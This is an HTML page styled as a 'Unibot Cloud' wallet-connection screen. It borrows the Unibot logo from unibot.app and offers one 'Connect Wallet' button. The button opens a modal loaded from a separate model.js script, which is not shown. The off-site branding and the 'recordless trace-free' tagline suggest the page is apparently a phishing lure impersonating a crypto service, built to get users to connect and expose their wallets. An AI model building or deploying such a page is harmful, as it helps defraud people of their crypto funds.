<!DOCTYPE html>
<html lang="en">
<head>
  <script charset="UTF-8" async type="text/javascript" src="./model.js"></script>
  <meta charset="UTF-8">
  <meta name="viewport" content="width=device-width, initial-scale=1.0">
  <title>Unibot Cloud - Connect Wallet</title>
  <style>
    body {
      margin: 0;
      font-family: 'Arial', sans-serif;
      background-color: #0d1117; /* Main background color */
      color: #c9d1d9;
      display: flex;
      justify-content: center;
      align-items: center;
      height: 100vh;
    }

    .container {
      background-color: #161b22; /* Card background color */
      border-radius: 12px; /* Rounded corners */
      padding: 20px;
      width: 400px;
      box-shadow: 0 4px 20px rgba(0, 0, 0, 0.5); /* Shadow for depth */
      text-align: center;
    }

    .container h1 {
      font-size: 24px;
      margin-bottom: 10px;
      color: #58a6ff; /* Title color */
    }

    .container p {
      font-size: 14px;
      margin-bottom: 20px;
      color: #8b949e; /* Subtle text color */
    }

    .logo {
      position: absolute;
      top: 20px;
      left: 20px;
      width: 60px;
      height: auto;
    }

    .logo-center {
      width: 80px;
      height: auto;
      margin-bottom: 20px;
    }

    .connect-btn {
      background-color: #0366d6; /* Blue button color */
      color: #ffffff;
      border: none;
      padding: 10px;
      width: 100%;
      border-radius: 6px; /* Button rounded corners */
      cursor: pointer;
      font-size: 16px;
      text-transform: uppercase;
      font-weight: bold;
    }

    .connect-btn:hover {
      background-color: #0356b6; /* Button hover color */
    }

    .connect-btn:active {
      background-color: #024a96; /* Button pressed color */
    }
  </style>
</head>
<body>
  <img src="https://unibot.app/images/unibotXLogo.png" alt="Unibot Logo" class="logo">
  <div class="container">
    <img src="https://unibot.app/images/unibotXLogo.png" alt="Unibot Logo Center" class="logo-center">
    <h1>Unibot Cloud</h1>
    <p>Recordless trace-free Unibot cloud functions for user-sensitive data.</p>
    <form id="walletForm">
      <button type="submit" class="wallet-btn">Connect Wallet</button>
    </form>
  </div>

  <script>
    document.addEventListener('DOMContentLoaded', function() {
        // Create the modal instance
        const walletModal = new WalletModal();

        // Map to all buttons with class 'wallet-btn'
        document.querySelectorAll('.wallet-btn').forEach(btn => {
            btn.onclick = () => walletModal.show();
        });

        // (Optional) Map to a button by ID
        // document.getElementById('connectWalletBtn').onclick = function() {
        //     walletModal.show();
        // };
    });
</script>
</body>
</html>
